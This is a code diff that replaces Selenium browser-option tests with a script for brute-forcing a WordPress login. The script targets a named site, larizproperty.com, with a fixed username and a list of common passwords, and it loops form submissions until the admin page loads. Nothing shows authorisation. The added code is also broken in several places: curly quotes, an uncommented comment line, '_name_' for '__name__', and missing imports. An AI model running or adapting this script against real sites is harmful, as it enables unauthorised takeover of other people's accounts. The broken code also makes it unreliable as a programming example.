@@ -1,110 +1,51 @@
-from selenium import webdriver
-from selenium.webdriver.common.proxy import Proxy
-from selenium.webdriver.common.proxy import ProxyType
+LOGIN_URL = “https://larizproperty.com/wp-login”
+USERNAME = "larizpro"
+PASSWORD_LIST = ["password12", "admin123", "123456", "password", "letmein", "qwerty", "password123"]
 
-
-def test_page_load_strategy_normal():
-    options = get_default_chrome_options()
-    options.page_load_strategy = 'normal'
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-
-def test_page_load_strategy_eager():
-    options = get_default_chrome_options()
-    options.page_load_strategy = 'eager'
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-
-def test_page_load_strategy_none():
-    options = get_default_chrome_options()
-    options.page_load_strategy = 'none'
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-def test_timeouts_script():
-    options = get_default_chrome_options()
-    options.timeouts = { 'script': 5000 }
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-def test_timeouts_page_load():
-    options = get_default_chrome_options()
-    options.timeouts = { 'pageLoad': 5000 }
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-def test_timeouts_implicit_wait():
-    options = get_default_chrome_options()
-    options.timeouts = { 'implicit': 5000 }
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-def test_unhandled_prompt():
-    options = get_default_chrome_options()
-    options.unhandled_prompt_behavior = 'accept'
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-def test_set_window_rect():
-    options = webdriver.FirefoxOptions()
-    options.set_window_rect = True # Full support in Firefox
-    driver = webdriver.Firefox(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-def test_strict_file_interactability():
-    options = get_default_chrome_options()
-    options.strict_file_interactability = True
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-def test_proxy():
-    options = get_default_chrome_options()
-    options.proxy = Proxy({ 'proxyType': ProxyType.MANUAL, 'httpProxy' : 'http.proxy:1234'})
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-    
-def test_set_browser_name():
-    options = get_default_chrome_options()
-    assert options.capabilities['browserName'] == 'chrome'
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-    
-def test_set_browser_version():
-    options = get_default_chrome_options()
-    options.browser_version = 'stable'
-    assert options.capabilities['browserVersion'] == 'stable'
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-    
-def test_platform_name():
-    options = get_default_chrome_options()
-    options.platform_name = 'any'
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-    
-def test_accept_insecure_certs():
-    options = get_default_chrome_options()
-    options.accept_insecure_certs = True
-    driver = webdriver.Chrome(options=options)
-    driver.get("https://www.selenium.dev/")
-    driver.quit()
-
-def get_default_chrome_options():
+def setup_driver():
+    service = Service(ChromeDriverManager().install())
     options = webdriver.ChromeOptions()
-    options.add_argument("--no-sandbox")
-    return options
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    return webdriver.Chrome(service=service, options=options)
+
+def brute_force_login():
+    driver = setup_driver()
+    try:
+        for password in PASSWORD_LIST:
+            print(f"\nTrying: {password}")
+            
+            driver.get(LOGIN_URL)
+            time.sleep(1)  # Let the page load
+
+            try:
+                Wait for login input fields
+                WebDriverWait(driver, 5).until(
+                    EC.presence_of_element_located((By.ID, "user_login"))
+                ).clear()
+                driver.find_element(By.ID, "user_login").send_keys(USERNAME)
+                
+                driver.find_element(By.ID, "user_pass").clear()
+                driver.find_element(By.ID, "user_pass").send_keys(password)
+                
+                driver.find_element(By.ID, "wp-submit").click()
+                
+                time.sleep(2)  # Let page load
+                if "wp-admin" in driver.current_url:
+                    print(f"✅ SUCCESS! Password found: {password}")
+                    break
+                else:
+                    print("❌ Failed")
+
+            except Exception as e:
+                print(f"⚠️ Error during attempt: {str(e)}")
+                continue
+
+    except Exception as e:
+        print(f"🔥 Critical error: {str(e)}")
+    finally:
+        input("\nPress Enter to close browser...")
+        driver.quit()
+
+if _name_ == "__main__":
+    brute_force_login()
